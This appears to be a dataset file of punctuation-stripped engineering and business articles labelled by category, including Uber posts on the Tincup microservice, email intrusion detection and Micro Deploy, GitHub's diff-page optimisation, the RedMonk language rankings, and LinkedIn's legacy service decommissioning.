in a relational PostgreSQL database with incremental integer IDs  However  this method of data storage does not allow for globally replicated data across all of Uber s data centers and thus does not align with our effort for an all active  simultaneously serving trips from all data centers  architecture  Since currencies and exchange rates are required to be accessible from all data centers  we swapped out the persistence layer to use UDR  Uber s globally replicated scalable datastore   Anticipating Concerns of Microservice Growth  After deciding on the design changes specific to currencies and exchange rates  we addressed the new concerns that naturally arise when the number of microservices in the engineering ecosystem increases   Tornado  Blocking on network I O is a serious concern that may lead to uWSGI worker starvation  If all requests to services like Tincup are synchronous  the degradation of one service runs the risk of causing a ripple effect and impacting all callers  We decided to adopt Tornado  an event loop based asynchronous framework for Python  to prevent blocking  Since we were tearing out a great amount of code from the  Flask  monolithic codebase  it was important for us to minimize risk by choosing an asynchronous framework that would allow much of the existing application logic to remain the same  Tornado met that requirement for us  as it allows for synchronous looking code but non blocking I O   Alternatively  to address the aforementioned I O issue  many service owners are giving a new language a Go    TChannel  What was once a single API call may fan out into a great number of calls to microservices  To facilitate the discovery of other services and and identification of points of failure in the large ecosystem  Uber microservices use open source TChannel over Hyperbahn  a network multiplexing and framing protocol for RPC developed in house  TChannel provides a protocol for clients and servers  with Hyperbahn s intelligent routing mesh connecting the two  It solves a few core issues that arise in a world of microservices   Service discovery  All producers and consumers register themselves with the routing mesh  Consumers access producers by name instead of needing to know about hosts or ports   Fault tolerance  The routing mesh tracks metrics like failure rates and SLA violations  It can detect unhealthy hosts and subsequently remove them from the pool of available hosts   Rate limiting and circuit breaking  These features ensure bad requests and slow responses from clients don t cause cascading failures   Thrift  Since the number of service calls grows rapidly  it is necessary to maintain a well defined interface for every call  We knew we wanted to use an IDL for managing this interface  and we ultimately decided on Thrift  Thrift forces service owners to publish strict interface definitions  which streamlines the process of integrating with services  Calls that do not abide by the interface are rejected at the Thrift level instead of leaking into a service and failing deeper within the code  This strategy of publicly declaring your interface emphasizes the importance of backwards compatibility  since multiple versions of a service s Thrift interface could be in use at any given time  The service author must not make breaking changes  and instead must only make non breaking additions to the interface definition until all consumers are ready for deprecation   Preparing Tincup for the Big Leagues  Production  Finally  when implementation stages of Tincup were near complete  we used a few helpful tools to prepare Tincup for the production environment   Hailstorm  First  we acknowledged that Uber s traffic is variable with the time of day  day of week  and day of year  We see huge peaks at expected times  like New Year s Eve and Halloween  so we must ensure that services can handle this increased load before we launch them  As required at Uber when launching a new service  we used our built in house Hailstorm service to load test Tincup s endpoints and determine shortcomings and breaking points   uContainer  Next  we considered another major goal for Uber Engineering  use hardware more efficiently  Since Tincup is a relatively lightweight service  it can easily share machines with other microservices  Sharing is caring  right  Well  not always we still want to ensure that each service runs independently and doesn t affect other services running on the same machine  To prevent that problem  we deployed Tincup using uContainer  Docker at Uber  for resource isolation and limitation  As its name implies  uContainer leverages Linux container capability and Docker to containerize Uber services  It wraps up a service into an isolated environment to guarantee that the service will run consistently  regardless of other running processes on that same host  uContainer extends Docker s capabilities by adding 1  features for more flexible builds and 2  tools for more visibility into the Docker containers   uDestroy  Finally  to prepare for outages and network connectivity issues that inevitably arise in production  we used an internal tool called uDestroy to unleash controlled chaos on our services  By simulating disruption on our own terms  we gain visibility into our systems  resilience  Since we periodically and purposefully disrupt our systems as they evolve  we can identify vulnerabilities and continually work to improve durability   Post Implementation Learnings  We learned several lessons about expanding the SOA through building Tincup   Migrating consumers is a long  slow process  so make it as easy as you can  Provide code examples  Budget time to walk people through this migration  Learning a tech stack is best on a small service  Tincup s application logic is very simple  which allowed developers to focus on learning the new tech stack rather than the detailed migration of business logic  Devoting the initial time to develop extensive unit and integration tests pays dividends down the road  Debugging issues with the code is much easier  and less stressful   if done in a development environment  Load test as early and often as you can  There s nothing worse than finding out that your system can t handle peak traffic after you have spent weeks or months implementing   Microservices at Uber  Uber s SOA migration has presented opportunities for many people to own services  even those with limited industry experience  Owning a service is a big responsibility  but Uber s open  knowledge sharing culture makes picking up a new set of technologies and owning a codebase a rewarding and valuable experience   Emily Reinhold is a software engineer on the Rider Platform of Uber Engineering s Money Team who led the development of Tincup   Like what you re reading  Sign up for our newsletter for updates from the Uber Engineering blog,"[952 673 1351 1016 281 1086 778 1300 773 1010 735]"
965,training-dataset/business/841.txt,business,Think Fast  Talk Smart  Communication TechniquesPublished on Dec 4  2014  Communication is critical to success in business and life  Concerned about an upcoming interview  Anxious about being asked to give your thoughts during a meeting  Fearful about needing to provide critical feedback in the moment  You are not alone  Learn and practice techniques that will help you speak spontaneously with greater confidence and clarity  regardless of content and context     Recorded on October 25  2014  in collaboration with the Stanford Alumni Association as part of Stanford Reunion Homecoming and the Graduate School of Business Fall Reunion Alumni Weekend     Speaker  Matt Abrahams   91 Matt Abrahams is a lecturer at the Stanford Graduate School of Business  teaching strategic communication  he also teaches public speaking in Stanford s Continuing Studies Program,"[965 1234 988 778 1216 809 278 281 1323 875 4]"
978,training-dataset/engineering/166.txt,engineering,Engineering Security Through Uber s Custom Email IDSby Dan Borges  Phishing is one of the largest and most difficult challenges for any enterprise security team  It s the great equalizer of security  we all have to deal with it  Well executed phishing attacks can trick people into making simple yet costly mistakes   One way companies guard against these phishing campaigns is to deploy commercial intrusion detection solutions  which analyze payloads in sandboxes where they can be safely checked before reaching an employee s inbox  This is the core competency of most email intrusion detection systems  IDS  available on the market today   At Uber  we decided to build our own email IDS for a couple of reasons   To drive operational benefits in price  extensibility  and performance  To exercise full control over features and alerts so we can adjust to evolving threats in real time  To capture advanced insight for debugging intrusion alerts and email processing at Uber in general  Operational benefits drove many of our design choices  starting with the decision to build it in a cloud based web hosting environment  For example  Amazon s AWS has native components that include SES  Lambda workers  S3 buckets  VPCs  a few EC2 hosts  a Memcached cluster  and an Elasticsearch cluster  Using an on demand platform gives us flexibility around when and how we use the IDS while conserving both processing and costs by not running it all the time  Amazon SNS gives us a scalable way to manage queues   Our email IDS reflects the microservice architecture at Uber  Like our overall architecture  the IDS splits each email into several pieces and analyzes these pieces in parallel through various on demand pipelines  We also took advantage of existing tools and services in the market  such as cloud based services and various in house analysis services  For example  we use an entire cluster of automated sandboxes in EC2 as well as alternative cloud based sandboxes  This architectural strategy gave us the opportunity to explore new security services while simultaneously debugging  developing new features  and optimizing performance in existing pipelines   Fast and Reliable  Solving for speed and performance is a constant priority at Uber  Many commercial IDS solutions offer comparable analysis capabilities  but they re often black boxes  so we get little debugging insight into their operations  We built two versions of our IDS to ensure email availability while we test and develop new features  Both instances run out of band  as to not delay the delivery of email with analysis time  One version runs in production  the other is used for testing  In this manner we can continuously develop and integrate new functionality and alert logic into our IDS  based on attacks and trends we see in the wild  Our production instance then has the ability to both alert on and delete emails in under a minute of them landing in an employee s inbox   By leveraging the existing capabilities of a large web hosting service  we were able to move much faster than developing everything ourselves  ElastiCache s native Memcached service deduplicates certain processing events  which speeds up our ability to process campaigns and large automated bulk email  Next  the native Elasticsearch functionality lets us cluster our identical signals for campaign and impact analysis  Not only does this help us identify phishing campaigns  but it also reduces the time required to process information before we get alerts  We ve tailored the popular GAM library into our own library  nicknamed superGAM  When our email IDS flags malicious emails  our context automation platform uses superGAM to delete the emails automatically before employees read them  Furthermore  automated monitoring including uptime metrics and alerts on metrics gives us an early warning system so we can address any bugs detected in the email IDS when they re still small   Future Proof  An important expectation for solutions we build in house is the ability to scale and adapt as the company grows and threats evolve  Therefore  our email IDS is designed to be highly extensible and accommodate future changes  For example  because of the way we designed our Lambda functions  we can connect or switch out other vendor products or in house services with ease  This is important as more people with unique expertise join our team because we can easily plug in whichever tools or pipelines they bring to the table   Additionally  the microservice architecture of our IDS enables separate  concurrent analysis  This means specialized members of our team can work on individual components of the IDS relevant to their specific domain expertise  For example  someone trained in reverse engineering can work on binary analysis tools  while someone else works on components dedicated to threat intel  and another person works in natural language processing  This setup allows us to continuously update and refine each part of the system in tandem with the other microservices the team develops   Cost Effective  Building our own solution reduced our annual costs to a fraction of the price of a commercial solution  With a cloud based storage service such as AWS  we can closely monitor costs and make immediate adjustments based on our needs  For example  we generate finance reports based on tags to determine the cost of specific components  In addition to increasing the speed of analysis  the deduplication efforts mentioned before play a major role in reducing processing costs   We also run several intel vendor solutions alongside our IDS for extra checks on threat intelligence and email context  These are services we re already paying for in other parts of the organization  so connecting them to IDS extracts even more value from those existing contracts  giving us additional temporal alerts regarding email senders  domains  and IP addresses being used in current attack campaigns   Extensibility and Beyond  With an extensible platform  you can continuously explore and add new capabilities as microservices are developed on the team  such as analysis for natural language processing  analysis of DOM components  or even a URL analysis engine  For example  we have plans to add an advanced static analysis pipeline  which will require strong reverse engineering capabilities  We also constantly refine our threat intelligence sources and applications  With this design  we can further develop the abstraction of rule files to decouple the alert logic from the infrastructure  with the aim of either sharing rules or open sourcing the infrastructure code later  Either way  the platform remains customizable and grows with the team  making it a valuable resource for our Security Response team   Dan Borges is an incident response engineer on Uber s Security Engineering team   We re continuing to hire and grow our Security Engineering team  Visit our Careers Page for security engineering openings,"[978 673 1351 1300 61 952 278 92 1373 281 778]"
980,training-dataset/engineering/1425.txt,engineering,The RedMonk Programming Language RankingsAfter clearing a series of obstacles   some mundane and irrelevant  others much less so   it s time to publish our bi annual RedMonk Programming Language Rankings  As many are aware  these rankings are a continuation of the original work that Drew Conway and John Myles White first looked at the question late in 2010  From a macro perspective  the process remains the same  we extract language rankings from GitHub and Stack Overflow  and combine them for a ranking that attempts to reflect both code  GitHub  and discussion  Stack Overflow  traction  The idea is not to offer a statistically valid representation of current usage  but rather to correlate language discussion  Stack Overflow  and usage  GitHub  in an effort to extract insights into potential future adoption trends   In January 2014  we were forced to make a change to the way that GitHub s rankings were collected because GitHub stopped providing them  This quarter s run features the first major change in how these rankings are conducted since then  To help understand how this change was made and why it was necessary  here s a brief explanation of our GitHub ranking process   The Process to Date  In our early language ranking runs we pulled the data directly from GitHub s Explore page  GitHub ceased publishing the rankings there  however  and in 2014 we found a new data source using the GitHub Archive public dataset on Google BigQuery   Our query counted repository languages  excluding forked repos  by aggregating total created events  Though now defunct  our previous query was similar to the one in this Stack Overflow answer   This query worked from 2014 through our last run in June 2016  However  we again needed to adjust our query due to changes in the GitHub Archive table structure as well as changes in GitHub s API that impacted GitHub Archive s language data  These changes provided the opportunity to evaluate our data source   Our Updated Process  In June 2016  GitHub and Google announced a second public data set for publicly licensed repos  We initially explored the languages table on this dataset as our new potential source  This data had that benefit of providing multiple languages for a repository based on the number of bytes used per language  which in theory could give a more accurate representation of languages rather than using a repo s primary language   However  we found that the results from this data were suboptimal because   This data only includes licensed repositories  a much smaller subset than the public repositories of GitHub Archive   Furthermore  the process of recognizing licenses is occasionally brittle  even further limiting the available data   The definition of languages expanded beyond what we have historically represented and included things like config files and typesetting systems   In what was our ultimate deciding factor  the results of this query were significantly less correlated with previous GitHub language data as well as Stack Overflow data   We also briefly explored the GH Torrent project  While this was an interesting data set that could be a great resource for curious individuals  its licensing prohibited our use in this instance   This ultimately led us back to GitHub Archive  Though we could not access the same language data that we had previously  we were able to query language by pull request  Our query resembles the one GitHub used to assemble the 2016 State of the Octoverse   We endeavored to make the new query as comparable as possible to the previous process   Language is based on the base repository language  While this continues to have the caveats outlined below  it does have the benefit of cohesion with our previous methodology   We exclude forked repos   We use the aggregated history to determine ranking  though based on the table structure changes this can no longer be accomplished via a single query    The primary change is that the GitHub portion of the language ranking is now based on pull requests rather than repos  While this means we couldn t replicate the rankings as they were before  the results were generally correlated with our past runs and were the best method available  On the positive side  it also eliminates the most common complaint regarding the rankings historically  that measurements by repo might overestimate a given language s importance   JavaScript  most frequently   The Net  The obvious question in the wake of this procedural change concerns impact  How do this quarter s rankings compare with our last run  There are two answers to that  first  the change within the GitHub portion of our rankings  second  the change in our rankings overall with the unaffected Stack Overflow results weighted in  In both cases  it depends on where in the Top 20 a language is ranked  Within our Top 10 languages  for example  the average ranking change for the GitHub only results was a significant but not enormous 1 2 spots  In the back half of the Top 20  however  the average change in a language s position was 5 7   When we weight in the Stack Overflow results  predictably  these differentials are somewhat more modest  Within the Top 10  languages moved on average only half a spot  And even in the much more volatile back half  the end change in the overall rankings was a mere three spots   This is  to be sure  the most significant change since we started performing this analysis  But as mentioned  after testing various approaches  this is the one most tightly correlated and thus offering the greatest continuity between our previous rankings   With that major update out of the way  please keep in mind the other usual caveats   To be included in this analysis  a language must be observable within both GitHub and Stack Overflow   No claims are made here that these rankings are representative of general usage more broadly  They are nothing more or less than an examination of the correlation between two populations we believe to be predictive of future use  hence their value   There are many potential communities that could be surveyed for this analysis  GitHub and Stack Overflow are used here first because of their size and second because of their public exposure of the data necessary for the analysis  We encourage  however  interested parties to perform their own analyses using other sources   All numerical rankings should be taken with a grain of salt  We rank by numbers here strictly for the sake of interest  In general  the numerical ranking is substantially less relevant than the language s tier or grouping  In many cases  one spot on the list is not distinguishable from the next  The separation between language tiers on the plot  however  is generally representative of substantial differences in relative popularity   In addition  the further down the rankings one goes  the less data available to rank languages by  Beyond the top tiers of languages  depending on the snapshot  the amount of data to assess is minute  and the actual placement of languages becomes less reliable the further down the list one proceeds   With that  here is the first quarter plot for 2017    Click to embiggen   Besides the above plot  which can be difficult to parse even at full size  we offer the following numerical rankings  As will be observed  this run produced several ties which are reflected below  they are listed out here alphabetically rather than consolidated as ties because the latter approach led to misunderstandings   Note that this is actually a list of the Top 23 languages  not Top 20  because of said ties   1 JavaScript  2 Java  3 Python  4 PHP  5 C   5 C    7 CSS  7 Ruby  9 C  10 Objective C  11 Scala  11 Shell  11 Swift  14 R  15 Go  15 Perl  17 TypeScript  18 PowerShell  19 Haskell  20 Clojure  20 CoffeeScript  20 Lua  20 Matlab  Updated process or no  JavaScript and Java retain their respective positions atop our rankings  The lack of movement in JavaScript is particularly notable given that some argued that measuring by repo overweighted JavaScript s actual significance versus a metric like pull requests  the basis for the new query  PHP has dropped a spot for the first time in the history of our rankings  but remains enormously popular even at the number four spot  Out of all of the languages in the top ten  on the other hand  Python benefitted the most from the change in our GitHub ranking process  where the average movement was one spot  Python jumped three spots  hence its leapfrogging of PHP  Outside of that  the only really notable movement in the top ten was Ruby dropping from five to seven   Lower down in the order  however  things get more interesting  A few comments on languages with notable movement  in no particular order   R   The preferred language for a growing number of statisticians  data scientists and other analytical types had been enjoying a incremental rise  moving from 15 to a steady 13 and finally jumping to 12 in our last run  This time around  however  the language falls back two spots to number 14  This is principally attributable to a softening in its GitHub ranking in the new process  Unlike its competitor in the analytical space  Python  which rose three spots along that axis  R fell five spots in our GitHub rankings even as its Stack Overflow ranking rose one place  This minor movement  however  says little about R s current or future performance  like PHP  the language remains popular in spite of a step back     The preferred language for a growing number of statisticians  data scientists and other analytical types had been enjoying a incremental rise  moving from 15 to a steady 13 and finally jumping to 12 in our last run  This time around  however  the language falls back two spots to number 14  This is principally attributable to a softening in its GitHub ranking in the new process  Unlike its competitor in the analytical space  Python  which rose three spots along that axis  R fell five spots in our GitHub rankings even as its Stack Overflow ranking rose one place  This minor movement  however  says little about R s current or future performance  like PHP  the language remains popular in spite of a step back  Swift   On the opposite end of the R  Swift was a major beneficiary of the new GitHub process  jumping eight spots from 24 to 16 on our GitHub rankings  While the language appears to be entering something of a trough of disillusionment from a market perception standpoint  with major hype giving way to skepticism in many quarters  its statistical performance according to the observable metrics we track remains strong  Swift has reached a Top 15 ranking faster than any other language we have tracked since we ve been performing these rankings  Its strong performance from a GitHub perspective suggests that the wider  multi platform approach taken by the language is paying benefits  As we ve said since it first entered our rankings  Swift remains a language to watch   Go   While Go also benefitted from the new ranking model  jumping four spots in the GitHub portion of our ranking system  that wasn t enough to keep up with Swift which leapfrogged it  To some extent  this isn t a surprise  as Go had neither the built in draw of iOS mobile app development nor is it generally positioned as a front and back end language as Swift increasingly is  More to the point  while it might have held static  a ranking of 15 is impressive for an infrastructure runtime   TypeScript   Last quarter  this was what we believed was the question facing TypeScript   The question facing the language isn t whether it can grow  but whether it has the momentum to crack the Top 20 in the next two to three quarters  leapfrogging the likes of CoffeeScript and Lua in the process   Well  consider that question answered  Of all of the top tier languages  none jumped more than TypeScript on our GitHub rankings  as the JavaScript superset moved up 17 points  While it also saw improvement in its Stack Overflow numbers  it was the GitHub improvement that vaulted it nine spots up and into the Top 20  We didn t have time to explore the basis for this movement  but it seems reasonable to suspect that Angular is playing a role   PowerShell   As mentioned above  no top tier language outperformed TypeScript on the GitHub portion of our rankings  but one language equaled it  PowerShell moved from 36 within the GitHub rankings to 19 to match TypeScript s 17 point jump  and that was enough to nudge it into the Top 20 overall from its prior ranking of 25  While we can t prove causation  it is interesting to note that this dramatic improvement from PowerShell comes one quarter after it was released as open source software  Between PowerShell and TypeScript  not to mention C  s sustained performance  Microsoft has reason to be pleased about is programming language investments   Rust  One of the biggest overall gainers of any of the measured languages  Rust leaped from 47 on our board to 26   one spot behind Visual Basic  This comes two quarters after the language not only stalled  but actually gave up ground in our last rankings  What a difference a few months can make  By our metrics  Rust went from the 46th most popular language on GitHub to the 18th  Some of that is potentially a result of the new process  of course  but no other language grew faster  Granted  it s easier for Rust to achieve that kind of growth than for a language already in the top tier  but nevertheless Rust s performance is impressive  It s possible that Rust is finally turning the corner and becoming the mainstream language that many expected it could be  We ll be watching its movement over the next few quarters to assess Rust s potential for moving into the Top 20   Credit  My colleague Rachel Stephens evaluated the available options for extracting rankings from GitHub data  and wrote and executed the queries that are responsible for the GitHub axis in these rankings,"[980 1392 641 1374 686 293 1341 902 613 778 673]"
988,training-dataset/business/525.txt,business,Pitch Practice with Paul Buchheit and Sam Altman at Startup School SV 2016Published on Dec 25  2016  During Startup School two companies went on stage to pitch Paul Buchheit  Sam Altman followed each founder and repitched their startup to Paul     The two startups were     Shipamax  https   www shipamax com     Jenna Brown  Shipamax helps companies hire ships     MyPurpleFolder  http   www mypurplefolder com     Kelli Thomas Drake  MyPurpleFolder helps patients and caregivers keep track of their medical records,"[988 134 112 1138 582 689 60 965 1216 540 695]"
1007,training-dataset/engineering/1220.txt,engineering,Lessons Learned from Decommissioning a Legacy Serviceinbox war QPS for the past six months  In this post  I would like to share some of my experiences and what I have learned from this project   Fix corner cases  It is guaranteed that you will not cover all endpoints that are currently in use  Some use cases might have very limited traffic that hasn t been caught in your analysis  Expect these to happen and leave some extra time for addressing issues   Figure out a strategy to deprecate each endpoint individually  You can start from the easiest endpoint that has a straightforward alternative endpoint  Then tackle each of the others one by one  Some of the alternatives might be implemented differently  like if the original endpoint is using HTTP GET and the replacement is using HTTP POST  or vice versa  Implementation differences like this need to be addressed individually  Sometimes it can be messy  but don t lose patience   Identify alternatives for each endpoint  Old services can be decommissioned mainly because most of their functionalities have been rewritten with better implementations  Identify the alternatives you have for each of the remaining endpoints   Figure out which endpoints are still in use  Using logs  InGraphs   Inspector  an internal tool to track pageviews   service call events  etc   you can get a clear picture of what endpoints are still in use  Build a table that has an analysis of traffic for all the endpoints still in use   I have learned a lot of things from doing this project   The code you write today will last longer than you imagine it would  In the industry  there is a 2 4 6 rule that frontend services usually last around two years  while APIs usually last around four years  and backend services usually last around six years  But in reality  the services will probably last much longer than you might have originally imagined  For example  inbox war was created in 2009  but has stayed for more than seven years  even though it is a frontend service   Think carefully about the design and implementation  People reading your code in the future may never meet you and will never attend your design meetings  Write code in a generic way that is easy to follow  rather than writing code in a hacky way to be cool  When removing one endpoint  I thought it was a simple endpoint that could be migrated by redirecting it to an alternative endpoint  But after doing this  another team complained that some functionality was broken  I figured out that part of the endpoint that served very limited traffic used HTTP POST  while 99  of traffic used HTTP GET  From this example  I have learned that when using any endpoint  you should use it for its intended purpose  rather than hacking it a certain way just to get your application to work  While this might help you get things done faster  future maintainers might face a lot challenges when working with your code  Quoting from one of the engineers on our team  Swapnil Ghike   Code is communication  It s our primary and the longest lasting tool to inform our thoughts to our current and future team  Thus  we should do this communication right    Always seek a clean solution  A lot of patches for bugs fall into this category  The fix is intended to be a temporary solution  but the code will probably stay there forever  You don t know your users  Your corner case will definitely be hit some day  especially for large scale apps used by millions or billions of people,"[1007 520 1351 778 1336 673 1225 61 1347 234 92]"
1008,training-dataset/engineering/351.txt,engineering,How we made diff pages three times fasterWe serve a lot of diffs here at GitHub  Because it is computationally expensive to generate and display a diff  we ve traditionally had to apply some very conservative limits on what gets loaded  We knew we could do better  and we set out to do so   Historical approach and problems  Before this change  we fetched diffs by asking Git for the diff between two commit objects  We would then parse the output  checking it against the various limits we had in place  At the time they were as follows   Up to 300 files in total   Up to 100KB of diff text per file   Up to 1MB of diff text overall   Up to 3 000 lines of diff text per file   Up to 20 000 lines of diff text overall   An overall RPC timeout of up to eight seconds  though in some places it would be adjusted to fit within the remaining time allotted to the request   These limits were in place to both prevent excessive load on the file servers  as well as prevent the browser s DOM from growing too large and making the web page less responsive   In practice  our limits did a pretty good job of protecting our servers and users  web browsers from being overloaded  But because these limits were applied in the order Git handed us back the diff text  it was possible for a diff to be truncated before we reached the interesting parts  Unfortunately  users had to fall back to command line tools to see their changes in these cases   Finally  we had timeouts happening far more frequently than we liked  Regardless of the size of the requested diff  we shouldn t force the user to wait up to eight seconds before responding  and even then occasionally with an error message   Our Goals  Our main goal was to improve the user experience around  re viewing diffs on GitHub   Allow users to  re view the changes that matter  rather than just whatever appears before the diff is truncated   Reduce request timeouts due to very large diffs   Pave the way for previously inaccessible optimizations  e g  avoid loading suppressed diffs    Reduce unnecessary load on GitHub s storage infrastructure   Improve accuracy of diff statistics   A new approach  To achieve the aforementioned goals  we had to come up with a new and better approach to handling large diffs  We wanted a solution that would allow us to get a high level overview of all changes in a diff  and then load the patch texts for the individual changed files  progressively   These discrete sections could later be assembled by the user s browser   But to achieve this without disrupting the user experience  our new solution also needed to be flexible enough to load and display diffs identically to how we were doing it in production to date  We wanted to verify accuracy and monitor any performance impact by running the old and new diff loading strategies in production  side by side  before changing to the new progressive loading strategy   Lucky for us  Git provides an excellent plumbing command called git diff tree    Diff  table of contents  with git diff tree  git diff tree is a low level  plumbing  git command that can be used to compare the contents of two tree objects and output the comparison result in different ways   The default output format is   raw   which prints a list of changed files     git diff tree   raw  r   find renames HEAD  HEAD  100644 100644 257cc5642cb1a054f08cc83f2d943e56fd3ebe99 441624ae5d2a2cd192aab3ad25d3772e428d4926 M fileA  100644 100644 5716ca5987cbf97d6bb54920bea6adde242d87e6 4ea306ce50a800061eaa6cd1654968900911e891 M fileB  100644 100644 7c4ede99d4fefc414a3f7d21ecaba1cbad40076b fb3f68e3ca24b2daf1a0575d08cd6fe993c3f287 M fileC  Using git diff tree   raw we could determine what changed at a high level very quickly  without the overhead of generating patch text  We could then later paginate through this list of changes  or  deltas   and load the exact patch data for each  page  by specifying a subset of the deltas  paths to git diff tree   patch    To better understand the obvious performance overhead of calling two git commands instead of one  and to ensure that we wouldn t cause any regressions in the returned data  we initially focused on generating the same output as a plain call to git diff tree   patch   by calling git diff tree   raw and then feeding all returned paths back into git diff tree   patch    We started a Scientist experiment which ran both algorithms in parallel  comparing accuracy and timing  This gave us detailed information on cases where results were not as expected  and allowed us to keep an eye on performance   As expected  our new algorithm  which was replacing something that hadn t been materially refactored in years  had many mismatches and performance was worse than before   Most of the issues that we found were simply unexpected behaviors of the old code under certain conditions  We meticulously emulated these corner cases  until we were left only with mismatches related to rename detection in git diff    Fetching diff text with git diff pairs  Loading the patch text from a set of deltas sounds like it should have been a pretty straightforward operation  We had the list of paths that changed  and just needed to look up the patch texts for these paths  What could possibly go wrong   In our first attempt we loaded the diffs by passing the first 300 paths from our deltas to git diff tree   patch   This emulated our existing behaviour    and we unexpectedly ran into rare mismatches  Curiously  these mismatches were all related to renames  but only when multiple files containing the same or very similar contents got renamed in the same diff   This happened because rename detection in git is based on the contents of the tree that it is operating on  and by looking at only a subset of the original tree  git s rename detection was failing to match renames as expected   To preserve the rename associations from the initial git diff tree   raw run   peff added a git diff pairs command to our fork of Git  Provided a set of blob object IDs  provided by the deltas  it returns the corresponding diff text  exactly what we needed   On a high level  the process for generating a diff in Git is as follows   Do a tree wide diff  generating modified pairs  or added deleted paths  which are just considered pairs with a null before after state   Run various algorithms on the whole set of pairs  like rename detection  This is just linking up adds and deletes of similar content  For each pair  output it in the appropriate format  we re interested in   patch   obviously    git diff pairs lets you take the output from step 2  and feed it individually into step 3   With this new function in place  we were finally able to get our performance and accuracy to a point where we could transparently switch to this new diff method without negative user impact   If you re interested in viewing or contributing to the source for git diff pairs we submitted it upstream here   Change statistics with git diff tree   numstat   shortstat  GitHub displays line change statistics for both the entire diff and each delta  Generating the line change statistics for a diff can be a very costly operation  depending on the size and contents of the diff  However  it is very useful to have summary statistics on a diff at a glance so that the user can have a good overview of the changes involved   Historically we counted the changes in the patch text as we processed it so that only one diff operation would need to run to display a diff  This operation and its results were cached so performance was optimal  However  in the case of truncated diffs there were changes that were never seen and therefore not included in these statistics  This was done to give us better performance at the cost of slightly inaccurate total counts for large diffs   With our move to progressive diffs  it would become increasingly likely that we would only ever be looking at a part of the diff at any one time so the counts would be inaccurate most of the time instead of rarely   To address this problem we decided to collect the statistics for the entire diff using git diff tree   numstat   shortstat   This would not only solve the problem of dealing with partial diffs  but also make the counts accurate in cases where they would have been incorrect before   The downside of this change is that Git was now potentially running the entire diff twice  We determined this was acceptable  however as the remaining diff processing for presentation was far more resource intensive  Also  with progressive diffs  it was entirely probable that many larger diffs would never have the second pass since those deltas might never be loaded anyway   Due to the nature of how git diff tree works  we were even able to combine the call for these statistics with the call for deltas into a single command  to further improve performance  This is because Git already needed to perform a full diff in order to determine what the statistics were  so having it also print the tree diff information is essentially free   Patches in batches  a whole new diff  For the initial request of a page containing a diff  we first fetched the deltas along with the diff statistics  Next we fetched as much diff text as we could  but with significantly reduced limits compared to before   To determine optimal limits  we turned to some of our copious internal metrics  We wanted results as quickly as possible  but we also wanted a solution which would display the full diff in  most  cases  Some of the information our metrics revealed was   81  of viewed diffs contain changes to fewer than ten files   52  of viewed diffs contain only changes to one or two files   80  of viewed diffs have fewer than 20KB of patch text   90  of viewed diffs have fewer than 1000 lines of patch text   From these  it was clear a great number of diffs only involved a handful of changes  If we set our new limits with these metrics in mind  we could continue to be very fast in most cases while significantly improving performance in previously slow or inaccessible diffs   In the end  we settled on the following for the initial request for a diff page   Up to 400 lines of diff text   Up to 20KB of diff text   A request cycle dependent timeout   A maximum individual patch size of 400 lines or 20KB   This allowed the initial request for a large diff to be much faster  and the rest of the diff to automatically load after the first batch of patches was already rendered   After one of the limits on patch text was reached during asynchronous batch loading  we simply render the deltas without their diff text and a  load diff  button to retrieve the patch as needed   Overall  the effective limits we enforce for the entire diff became   Up to 3 000 files   Up to 60 000 000 lines  not loaded automatically    Up to 3GB of diff text  also not loaded automatically    With these changes  you got more of the diff you needed in less time than ever before  Of course  viewing a 60 000 000 line diff would require the user to press the  load diff  button more than a couple thousand times   The benefits to this approach were a clear win  The number of diff timeouts dropped almost immediately   Additionally  the higher percentile performance of our main diffs pages improved by nearly 3x   Our diff pages pages were traditionally among our worst performing  so the performance win was even noticeable on our high percentile graph for overall requests  performance across the entire site  shaving off around 3 5s from the 99 9th percentile   Looking to the future  This new approach opens the door to new types of optimizations and interface ideas that weren t possible before  We ll be continuing to improve how we fetch and render diffs  making them more useful and responsive,"[1008 1326 683 895 579 550 778 713 1351 1336 1399]"
1010,training-dataset/engineering/1495.txt,engineering,Uber Engineering s Micro Deploy  Deploying Daily with Confidenceby Mathias Schwarz  In 2014  Uber began expanding ever rapidly  Our platform grew from about 60 cities to 100 in the spring  and then to 200 in the fall  Meanwhile  our fastest growing cities were among our oldest   As the number of additional platform engineers grew  so did the disorganization of deploying new code  Each team used its own custom shell scripts to shepherd new versions of its microservices into production  manually monitoring them with service specific tools  When upgrading hosts went awry  engineers tediously rolled back one machine at a time  With more and more engineers working on Uber services  this manual labor couldn t scale and sometimes prolonged outages   How did we learn to consistently deploy every day  We developed Micro Deploy  known as  Deploy for short   our in house deployment system that builds  upgrades  and rolls back services at Uber   The Daily Deployment Process  Uber engineers use Micro Deploy once their code is production ready that is  once it s reviewed  accepted  passing all unit tests  and merged into the repository  First  the engineer selects a service to upgrade in the  Deploy interface  To start an upgrade workflow  they select a deployment and refer to a version of the source code in the Git repository   Behind the scenes   Deploy builds the service as needed  distributes the build  talks to the relevant masters in the right data centers  and has each agent update the service on the hosts marked for deployment  Throughout the process  the  Deploy user interface gives visual feedback about the state of the rollout until the workflow completes so that the engineer can move on to another task   In this way   Deploy builds and rolls out most services within a few minutes  This is also how quickly an engineer can have an impact   The interim between an engineer writing code to its going live in Uber s production systems is incredibly short  Uber s growth has not slowed since we rolled out the initial version of  Deploy  Each week in 2016  thousands of engineers push to prod several thousand service builds  10  of which  Deploy rejects after monitoring  rolling them back to the previous version  This means that some part of the Uber system starts upgrading every single minute during working hours  Since updates typically take more than a minute  the system is always on its way to a new version   Our Mission  Deploy with Confidence  Micro Deploy itself consists of many microservices  most of which deploy with  Deploy   A web application UI plus CLI lets engineers choose how to interact with  Deploy    Deploy agents run on each machine in our data centers  The agent installs and reconfigures services when instructed by its  Deploy master  The agent also reports the machine status back to master with a full overview of each service    Deploy masters control how the  Deploy agents behave on all the machines in a data center  Each data center has at least one master   The  Deploy aggregator interfaces with a master in each data center to manage deployments throughout   A system we call uBuild builds services before a rollout in a single cluster of uBuild machines and then distributes them to all data centers    Deploy replicators copy final builds within and between data centers    Deploy orchestrators manage rollout workflows in a distributed and fault tolerant manner    Deploy placement locates a set of host machines for deploying a service   A system we call uConfig allows service configuration changes to roll out in the same way as service upgrades   What Features are Important in a Deployment System   A combination of features make Micro Deploy a complete build and deployment management system for us  These are what we consider to be important to develop a deployment system for infrastructure systems like Uber s   Consistent builds for different services  Micro Deploy is an integrated build system for all kinds of services at Uber  Python with Tornado  JavaScript with Node js  Go  Java  with Docker  and without containers  Yes  The  Deploy build system handles many programming languages and machines with different software stacks  Our integrated build system standardizes our production service 